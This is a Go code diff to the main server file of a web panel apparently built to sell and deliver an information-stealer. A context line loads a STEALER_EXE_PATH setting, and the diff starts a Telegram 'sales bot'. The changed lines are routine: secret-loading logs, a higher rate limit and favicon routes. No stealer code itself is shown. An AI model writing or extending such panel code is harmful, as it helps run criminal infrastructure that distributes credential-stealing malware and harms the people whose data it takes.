@@ -27,6 +27,7 @@ import (
 	"zialfi-panel/internal/api"
 	"zialfi-panel/internal/db"
 	mw "zialfi-panel/internal/middleware"
+	"zialfi-panel/internal/services/bot"
 	"zialfi-panel/internal/ws"
 )
 
@@ -122,8 +123,10 @@ func main() {
 		secretFile := filepath.Join(filepath.Dir(dbPath), ".jwt_secret")
 		if data, err := os.ReadFile(secretFile); err == nil {
 			jwtSecret = strings.TrimSpace(string(data))
+			slog.Info("loaded JWT secret from file", "path", secretFile)
 		} else {
 			jwtSecret = generateSecret()
+			slog.Warn("generated new JWT secret — all existing sessions are now invalid", "path", secretFile)
 			if err := os.WriteFile(secretFile, []byte(jwtSecret), 0600); err != nil {
 				slog.Warn("failed to persist JWT secret, tokens will be invalid after restart", "err", err)
 			}
@@ -185,7 +188,7 @@ func main() {
 
 	r.Use(mw.CORS(allowedOrigins))
 	r.Use(mw.CSRFProtect)
-	r.Use(mw.RateLimit(100, time.Minute))
+	r.Use(mw.RateLimit(500, time.Minute))
 	r.Use(mw.BanCheck(sqlDB))
 
 	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
@@ -204,6 +207,9 @@ func main() {
 	wsHub := ws.NewHub()
 	go wsHub.Run()
 
+	// Start Telegram sales bot
+	tgBot := bot.New(sqlDB)
+	go tgBot.Start()
 	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret, allowedOrigins))
 
 	stealerPath := getEnv("STEALER_EXE_PATH", "")
@@ -239,6 +245,26 @@ func main() {
 	}
 
 	r.Handle("/assets/*", http.FileServer(http.FS(distFS)))
+
+	// Serve favicon and other root-level static files
+	for _, name := range []string{"favicon.png", "favicon-16x16.png", "favicon-32x32.png", "favicon.svg", "favicon_full.png", "favicon-full.png", "apple-touch-icon.png", "android-chrome-192x192.png", "android-chrome-512x512.png", "site.webmanifest", "icons.svg"} {
+		localName := name // capture for closure
+		r.Get("/"+localName, func(w http.ResponseWriter, r *http.Request) {
+			data, err := fs.ReadFile(distFS, localName)
+			if err != nil {
+				http.NotFound(w, r)
+				return
+			}
+			if strings.HasSuffix(localName, ".png") {
+				w.Header().Set("Content-Type", "image/png")
+			} else if strings.HasSuffix(localName, ".svg") {
+				w.Header().Set("Content-Type", "image/svg+xml")
+			} else if strings.HasSuffix(localName, ".webmanifest") {
+				w.Header().Set("Content-Type", "application/manifest+json")
+			}
+			w.Write(data)
+		})
+	}
 
 	r.Get("/public/*", func(w http.ResponseWriter, r *http.Request) {
 		index, err := fs.ReadFile(distFS, "index.html")
